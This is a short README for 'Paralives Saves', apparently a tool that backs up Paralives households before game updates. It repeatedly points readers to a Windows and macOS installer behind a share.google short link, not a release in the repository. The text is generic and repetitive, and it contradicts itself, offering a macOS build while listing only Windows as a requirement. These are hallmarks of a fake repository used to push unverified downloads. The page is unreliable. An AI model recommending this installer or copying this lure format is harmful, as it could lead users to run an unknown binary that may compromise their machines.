![Paralives Saves](assets/hero.png)

# Paralives Saves

*Keep families on disk before an Early Access update.*

## What Paralives Saves is

This repository is **Paralives Saves**, a desktop helper. Keep families on disk before an Early Access update.

Life-sim households break when a patch moves folders.

No browser upload step: the work happens on disk, then you keep the output folder.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Finds the Paralives user data folder.
- Copies households and lots to a dated archive.
- Lists custom content paths.
- Writes a short report of what was kept.

## The problem

Players look for a Paralives save tool on the desktop.

A named helper is easier than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/emily7141/paralives-saves

MIT license. See `LICENSE`.
